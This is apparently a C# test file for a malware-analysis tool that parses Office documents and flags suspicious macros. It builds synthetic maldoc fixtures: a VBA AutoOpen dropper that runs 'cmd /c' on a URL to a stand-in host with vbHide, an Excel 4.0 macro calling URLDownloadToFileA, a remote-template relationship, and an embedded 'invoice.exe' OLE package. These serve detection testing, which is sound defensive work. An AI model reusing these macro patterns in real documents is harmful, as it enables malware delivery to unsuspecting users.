using System.Text;
using Corvus.Core;
using Corvus.Core.Documents;
using Corvus.Services.Analysis;
using static Corvus.Tests.DocumentFixtures;

namespace Corvus.Tests;

/// <summary>OLE compound files and OOXML packages: VBA sources, Excel 4.0 macros, OLE Package objects and the macro findings.</summary>
public sealed class OfficeDocumentTests
{
    private const string Dropper = "Sub AutoOpen()\r\n  Dim s\r\n  s = \"http://example.test/a.exe\"\r\n  Shell \"cmd /c \" & s, vbHide\r\n  x = \"636D642E657865\"\r\nEnd Sub\r\n";

    private static byte[] WordDocument() => Compound([("WordDocument", new byte[600]), .. VbaStreams("Macros/", ("ThisDocument", "document", ""), ("Module1", "standard", Dropper))]);

    private static OfficeFileView.Facts? View(byte[] data, string name = "doc.doc") =>
        new OfficeFileView().Inspect(new FileInput(name, data, Blob.Identify(data)), default)?.Detail as OfficeFileView.Facts;

    [Fact]
    public void Ovba_compression_round_trips_with_copy_tokens_across_chunks()
    {
        var text = Encoding.ASCII.GetBytes(string.Concat(Enumerable.Range(0, 900).Select(i => $"Line {i % 37}: Shell \"cmd\"\r\n")));
        var packed = Compress(text);
        Assert.True(packed.Length < text.Length / 3, $"{packed.Length} of {text.Length}");
        Assert.Equal(text, VbaProject.Decompress(packed, 1 << 20));
    }

    [Fact]
    public void A_word_document_lists_its_streams_and_writes_the_module_sources()
    {
        var c = Containers.Open(WordDocument(), "doc.doc", AnalysisLimits.Default, default, allFiles: false);
        Assert.Equal("Word document", c.Kind);
        var module = Assert.Single(c.Items, i => i.Name == "Macros/VBA/Module1.bas");
        Assert.Contains("Shell \"cmd /c \" & s, vbHide", Encoding.UTF8.GetString(module.Bytes));
        Assert.Contains(c.Items, i => i.Name == "Macros/VBA/ThisDocument.cls");
        Assert.Contains(c.Entries!, e => e.Path == "Macros/VBA/dir");
        Assert.Contains(c.Entries!, e => e.Path == "WordDocument" && e.Size == 600);
        Assert.DoesNotContain(c.Items, i => i.Name == "WordDocument"); // not a binary: listed, not extracted
    }

    [Fact]
    public void Findings_name_autorun_entry_points_calls_and_addresses_with_their_line()
    {
        var f = View(WordDocument())!;
        Assert.Equal("Word document", f.Format);
        var project = Assert.Single(f.Projects);
        Assert.Equal(["ThisDocument:document", "Module1:standard"], project.Modules.Select(m => $"{m.Name}:{m.Type}"));
        var rows = f.Findings.ToDictionary(r => (r.Type, r.Keyword));
        Assert.Equal("Module1:2", rows[("AutoExec", "AutoOpen")].Location);
        Assert.Equal("Module1:5", rows[("Suspicious", "Shell")].Location);
        Assert.True(rows.ContainsKey(("Suspicious", "vbHide")));
        Assert.True(rows.ContainsKey(("IOC", "http://example.test/a.exe")));
        Assert.True(rows.ContainsKey(("IOC", "a.exe")));
        // the hex string decodes to an executable name, found again under Hex
        Assert.Equal("Hex", rows[("IOC", "cmd.exe")].Decoded);
        Assert.True(rows.ContainsKey(("Hex String", "cmd.exe")));
    }

    [Fact]
    public void A_macro_enabled_ooxml_document_is_read_through_its_vba_project_part()
    {
        var bin = Compound(VbaStreams("", ("ThisDocument", "document", "Private Sub Document_Open()\r\n  CreateObject(\"WScript.Shell\").Run \"calc\"\r\nEnd Sub\r\n")));
        var rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"http://example.test/t.dotm\" TargetMode=\"External\"/></Relationships>";
        var docm = Ooxml(("word/document.xml", "<w:document/>"u8.ToArray()), ("word/vbaProject.bin", bin), ("word/_rels/settings.xml.rels", Encoding.UTF8.GetBytes(rels)));
        var f = View(docm, "a.docm")!;
        Assert.Equal("Word document (OOXML)", f.Format);
        Assert.Contains(f.Findings, r => r is { Type: "AutoExec", Keyword: "Document_Open", Location: "ThisDocument:2" });
        Assert.Contains(f.Findings, r => r is { Type: "Suspicious", Keyword: "WScript.Shell" });
        Assert.Contains(f.Findings, r => r is { Type: "IOC", Keyword: "http://example.test/t.dotm", Location: "word/_rels/settings.xml.rels" });

        // unpack follows the part into the compound file
        var c = Containers.Open(bin, "vbaProject.bin", AnalysisLimits.Default, default);
        Assert.Equal("VBA project", c.Kind);
        Assert.Contains(c.Items, i => i.Name == "VBA/ThisDocument.cls");
    }

    [Fact]
    public void A_package_encrypted_with_excels_built_in_password_is_decrypted_and_read()
    {
        var bin = Compound(VbaStreams("", ("Module1", "standard", "Sub Auto_Open()\r\n  Shell \"calc\"\r\nEnd Sub\r\n")));
        var xlsm = Ooxml(("xl/workbook.xml", "<workbook/>"u8.ToArray()), ("xl/vbaProject.bin", bin));
        var f = View(StandardEncrypted(xlsm, "VelvetSweatshop"), "a.xlsm")!;
        Assert.Equal("Excel workbook (OOXML), encrypted", f.Format);
        Assert.Equal("EncryptedPackage/xl/vbaProject.bin/", Assert.Single(f.Projects).Storage);
        Assert.Contains(f.Findings, r => r is { Type: "AutoExec", Keyword: "Auto_Open", Location: "Module1:2" });
        Assert.Contains(f.Notes, n => n.Contains("standard encryption, password VelvetSweatshop", StringComparison.Ordinal));

        var other = View(StandardEncrypted(xlsm, "a long secret"), "b.xlsm")!;
        Assert.True(other.Encrypted);
        Assert.Empty(other.Projects);
        Assert.Contains(other.Notes, n => n.Contains("not decrypted", StringComparison.Ordinal));
    }

    [Fact]
    public void An_ole_package_object_is_extracted_under_its_embedded_name()
    {
        var exe = ContainerFixtures.Module("Payload");
        var doc = Compound([("WordDocument", new byte[10]), ("ObjectPool/_1234/\u0001Ole10Native", Ole10Native("invoice.exe", @"C:\Users\a\invoice.exe", exe))]);
        var c = Containers.Open(doc, "doc.doc", AnalysisLimits.Default, default);
        var item = Assert.Single(c.Items, i => i.Name == "ObjectPool/_1234/invoice.exe");
        Assert.Equal(exe, item.Bytes);
        Assert.Contains(c.Entries!, e => e.Path == "ObjectPool/_1234/[1]Ole10Native");
        var o = Assert.Single(View(doc)!.Objects);
        Assert.Equal((@"C:\Users\a\invoice.exe", ".NET assembly"), (o.SourcePath, o.Kind));
    }

    [Fact]
    public void Excel_4_macro_sheets_are_decoded_with_their_visibility_and_auto_open()
    {
        var book = Biff8Workbook("Macro1", 2, Call(110, "calc.exe"), Call(149, "URLMON", "URLDownloadToFileA", "JJCCJJ"), Call(54));
        var f = View(Compound([("Workbook", book)]), "b.xls")!;
        Assert.Equal("Excel workbook", f.Format);
        Assert.Contains(f.Sheets!, s => s is { Name: "Macro1", Type: "macro sheet", State: "very hidden" });
        Assert.Equal(3, f.XlmFormulas);
        Assert.Contains("Name Auto_Open = !A1", f.DefinedNames!);
        Assert.Contains(f.Findings, r => r is { Type: "AutoExec", Keyword: "Auto_Open" });
        Assert.Contains(f.Findings, r => r is { Type: "Suspicious", Keyword: "EXEC" });
        Assert.Contains(f.Findings, r => r is { Type: "Suspicious", Keyword: "REGISTER" });
        Assert.Contains(f.Findings, r => r is { Type: "Suspicious", Keyword: "XLM macro" });
        var text = Encoding.UTF8.GetString(Containers.Open(Compound([("Workbook", book)]), "b.xls", AnalysisLimits.Default, default).Items.Single(i => i.Name == "xlm_macros.txt").Bytes);
        Assert.Contains("Macro1!A1: EXEC(\"calc.exe\")", text);
        Assert.Contains("Macro1!A2: REGISTER(\"URLMON\",\"URLDownloadToFileA\",\"JJCCJJ\")", text);
        Assert.Contains("Macro1!A3: HALT()", text);
    }

    [Fact]
    public void An_xlsm_macro_sheet_is_read_from_its_parts()
    {
        var wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><sheets><sheet name=\"M\" sheetId=\"1\" state=\"hidden\" r:id=\"rId1\"/></sheets><definedNames><definedName name=\"_xlnm.Auto_Open\">M!$A$1</definedName></definedNames></workbook>";
        var rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"x\" Target=\"macrosheets/sheet1.xml\"/></Relationships>";
        var sheet = "<xm:macrosheet xmlns:xm=\"x\"><sheetData><row><c r=\"A1\"><f>EXEC(\"calc\")</f></c></row></sheetData></xm:macrosheet>";
        var f = View(Ooxml(("xl/workbook.xml", Encoding.UTF8.GetBytes(wb)), ("xl/_rels/workbook.xml.rels", Encoding.UTF8.GetBytes(rels)), ("xl/macrosheets/sheet1.xml", Encoding.UTF8.GetBytes(sheet))), "a.xlsm")!;
        Assert.Contains(f.Sheets!, s => s is { Name: "M", Type: "macro sheet", State: "hidden" });
        Assert.Contains(f.Findings, r => r is { Type: "AutoExec", Keyword: "Auto_Open" });
        Assert.Contains(f.Findings, r => r is { Type: "Suspicious", Keyword: "EXEC" });
    }

    [Fact]
    public void A_powerpoint_97_presentation_reads_the_vba_storage_it_compresses()
    {
        var vba = Compound(VbaStreams("", ("Module1", "standard", "Sub Action_Click()\r\n  Shell \"calc\"\r\nEnd Sub\r\n")));
        var zlib = new MemoryStream();
        using (var z = new System.IO.Compression.ZLibStream(zlib, System.IO.Compression.CompressionLevel.Optimal, leaveOpen: true)) z.Write(vba);
        // a DocumentContainer (version 0xF) holding one ExOleObjStg atom, instance 1: decompressed size, then zlib data
        var atom = new MemoryStream();
        atom.Write(BitConverter.GetBytes((ushort)0x0010)); atom.Write(BitConverter.GetBytes((ushort)0x1011));
        atom.Write(BitConverter.GetBytes((uint)(4 + zlib.Length))); atom.Write(BitConverter.GetBytes((uint)vba.Length)); atom.Write(zlib.ToArray());
        var stream = new MemoryStream();
        stream.Write(BitConverter.GetBytes((ushort)0x000F)); stream.Write(BitConverter.GetBytes((ushort)0x03E8)); stream.Write(BitConverter.GetBytes((uint)atom.Length));
        stream.Write(atom.ToArray());
        var ppt = Compound([("PowerPoint Document", stream.ToArray()), ("Current User", new byte[20])]);
        var f = View(ppt, "a.ppt")!;
        Assert.Equal("PowerPoint presentation", f.Format);
        Assert.Equal("PowerPoint Document/ExOleObjStg@0x8/", Assert.Single(f.Projects).Storage);
        Assert.Contains(f.Findings, r => r is { Type: "AutoExec", Keyword: "Action_Click", Location: "Module1:2" });
        Assert.Contains(Containers.Open(ppt, "a.ppt", AnalysisLimits.Default, default).Items, i => i.Name == "PowerPoint Document/ExOleObjStg@0x8/VBA/Module1.bas");
    }

    [Fact]
    public void A_sylk_file_with_a_macro_sheet_option_is_read_as_excel_4_macros()
    {
        var slk = "ID;PWXL;N;E\r\nO;L;E;D;V0\r\nNN;NAuto_Open;ER1C1\r\nC;Y1;X1;KFALSE;EEXEC(\"calc\")\r\nC;Y2;EHALT()\r\nE\r\n"u8.ToArray();
        var f = View(slk, "a.slk")!;
        Assert.Equal("SYLK spreadsheet", f.Format);
        Assert.Equal(2, f.XlmFormulas);
        Assert.Contains(f.Findings, r => r is { Type: "AutoExec", Keyword: "Auto_Open" });
        Assert.Contains(f.Findings, r => r is { Type: "Suspicious", Keyword: "EXEC" });
    }

    [Fact]
    public void A_looping_sector_chain_ends_with_a_note()
    {
        var doc = WordDocument();
        // point the first FAT entry after the FAT itself back at itself: the directory chain loops
        var start = BitConverter.ToUInt32(doc, 48);
        BitConverter.GetBytes(start).CopyTo(doc, 512 + (int)start * 4);
        var c = Containers.Open(doc, "doc.doc", AnalysisLimits.Default, default);
        Assert.Contains(c.Notes, n => n.Contains("loops", StringComparison.Ordinal));
    }

    [Fact]
    [FuzzEntry(typeof(CompoundFileReader), typeof(CompoundFile), typeof(OfficeDocument), typeof(OfficeFileView))]
    public void Fuzzed_documents_never_throw_past_a_tool_error()
    {
        var bin = Compound(VbaStreams("", ("Module1", "standard", Dropper)));
        var seeds = new[]
        {
            ("doc.doc", WordDocument()), ("b.xls", Compound([("Workbook", Biff8Workbook("M", 1, Call(110, "calc")))])),
            ("a.docm", Ooxml(("word/document.xml", "<w:document/>"u8.ToArray()), ("word/vbaProject.bin", bin))),
        };
        foreach (var (name, seed) in seeds)
        {
            var failures = FormatFuzz.Run(seed, b =>
            {
                try { Containers.Open(b, name, AnalysisLimits.Default, default); } catch (ToolError) { }
                try { View(b, name); } catch (ToolError) { }
            }, 300);
            Assert.True(failures.Count == 0, name + ": " + string.Join("\n", failures.Take(20)));
        }
    }
}
